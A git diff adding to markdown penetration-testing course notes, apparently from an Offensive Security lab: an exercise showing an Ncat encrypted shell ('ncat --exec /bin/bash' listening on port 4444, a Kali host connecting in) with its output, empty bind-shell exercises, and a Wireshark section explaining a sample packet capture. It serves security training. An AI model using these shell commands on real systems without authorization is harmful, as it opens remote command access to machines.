@@ -139,10 +139,10 @@ Copyright (c) 2009 Microsoft Corporation. All rights reserved.
 C:\Users\offsec> ipconfig 
 Windows IP Configuration
 Ethernet adapter Local Area Connection:
-Connection-specific DNS Suffix  . :
-IPv4 Address. . . . . . . . . . . : 10.0.0.22
-Subnet Mask . . . . . . . . . . . : 255.255.255.0
-Default Gateway . . . . . . . . . : 10.0.0.138
+Connection-specific DNS Suffix  .:
+IPv4 Address. . . . . . . . . . .: 10.0.0.22
+Subnet Mask . . . . . . . . . . .: 255.255.255.0
+Default Gateway . . . . . . . . .: 10.0.0.138
 
 C:\Users\offsec>
 ```
@@ -254,3 +254,82 @@ Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation.  
 
 C:\Users\offsec>
 ```
+
+## Exercises
+
+1. Use Ncat to create an encrypted reverse shell from your Windows system to your Kali machine.
+
+> Ubuntu (Windows)
+```
+ncat --exec /bin/bash --allow 127.0.0.1 -vnl 4444 --ssl
+Ncat: Version 7.01 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 754B C09E EA5A 9624 BC01 CF3B 1B5E 73B6 8850 5EAA
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+```
+
+> Kali Linux
+```
+ncat -v 10.0.2.2 4444 --ssl
+Ncat: Version 7.60 ( https://nmap.org/ncat )
+Ncat: Subject: CN=localhost
+Ncat: Issuer: CN=localhost
+Ncat: SHA-1 fingerprint: 754B C09E EA5A 9624 BC01 CF3B 1B5E 73B6 8850 5EAA
+Ncat: Certificate verification failed (self signed certificate).
+Ncat: SSL connection to 10.0.2.2:4444.
+Ncat: SHA-1 fingerprint: 754B C09E EA5A 9624 BC01 CF3B 1B5E 73B6 8850 5EAA
+```
+
+2. Crate and encrypted bind shell on your Windows VM. Try to connect to it from kali without encryption. Does it still work?
+
+```
+```
+
+3. Make an unencrypted Ncat bind shell on your Windows system. COnnect to the shell using Netcat. Does it work?
+
+```
+```
+
+## 2.3 - Wireshark
+
+As a secutiry professional, learning how to use a network packet sniffer is vital for day-to-day operations. Whether you are trying to inderstand a protocol, debug a network client, or analyze traffic, you'll always end up nedding a network sniffer.
+
+### 2.3.1 - Wireshark Basics
+
+Wireshark uses **Libpcap** (on Linux) or **Winpcap** (on Windows) libraries in order to capture packets from the network. The secret to using network sniffers such as **wireshark** is using capture and display filters to remove all information that you are not interested in.
+
+### 2.3.2 - Making Sense of Network Dumps
+
+Let's examine the following **pcap** dump of an attempt to browse to the **www.yahoo.com** website, and try to make sense of it.
+
+| No. 	| Time 		  | Source 			 | Destination 	| Protocol | Info 									|
+| --- 	| ---- 		  | ------ 			 | ----------- 	| -------- | ---- 									|
+| 01	| 0.000000000 | Vmware_64:24:3e  | Broadcast 	| ARP 	   | Who has 10.0.0.138? Tell 10.0.0.18 	|
+| 02	| 0.001182000 | Netgear_6b:9a:8a | Vmware_64:24	| ARP 	   | 10.0.0.138 is at e0:46:9a:6b:9a:8a 	|
+| 03	| 0.001200000 | 10.0.0.18		 | 8.8.8.8		| DNS	   | Standard query 0x93f4 A www.yahoo.com 	|
+| 04	| 0.001238000 | 10.0.0.18		 | 8.8.8.8		| DNS 	   | Standard query 0xbefa AAAA www.yahoo.com |
+| 05	| 0.095027000 | 8.8.8.8			 | 10.0.0.18    | DNS	   | Standard query response 0x93f4 CNAME fd-fp3.wg1.b ... |
+| 06	| 0.095421000 | 8.8.8.8			 | 10.0.0.18    | DNS	   | Standard query response 0xbefa CNAME fd-fp3.wg1.b ... |
+| 07	| 0.095600800 | 10.0.0.18		 | 98.139.183.24| TCP      | 48209 > http [SYN] Seq=0 Win=14600 Len=0 MSS-1460 ... |
+| 08	| 0.300527000 | 98.139.183.24    | 10.0.0.18	| TCP 	   | http > 48209 [SYN, ACK] Seq=0 Ack=1 Win=8192 Len-0 ... |
+| 09 	| 0.300612000 | 10.0.0.18		 | 98.139.183.24| TCP      | 48209 > http [ACK] Seq=1 Ack=1 Win=14720 Len=0  ... |
+| 10 	| 0.300796000 | 10.0.0.18		 | 98.139.183.24| HTTP     | GET / HTTP/1.1 |
+
+* **Packet 01** : ARP broadcast looking fot the default gateway.
+* **Packet 02** : ARP unicast reply providing the MAC address of the gateway
+* **Packet 03** : DNS A (IP v4) forward lookup query for yahoo.com
+* **Packet 04** : DNS AAAA (IP v6) forward lookup query
+* **Packet 05** : DNS A response received.
+* **Packet 06** : DNS AAAA response received
+* **Packet 07-09** : 3-way handshake with port 80 on yahoo.com
+* **Packet 10** : Initial protocol negotiation in HTTP.GET request sent
+
+### 2.3.3 -  Capture and Display Filters
+
+Capture dumps are rarely as clear, as there is usually a lot of background traffic on a network. **Capture filters** come to our aid, as they can filter out noninteresting traffic from the dump. These filters greatly help pinpoint the traffic you want, and reduce background noise to a point where you can once again make sense of what you see.
+
+Once the traffic is captured, we can select the traffic we want Wireshark to display to us using display filters (top left).
+
+### 2.3.4 - Following TCP Streams
+
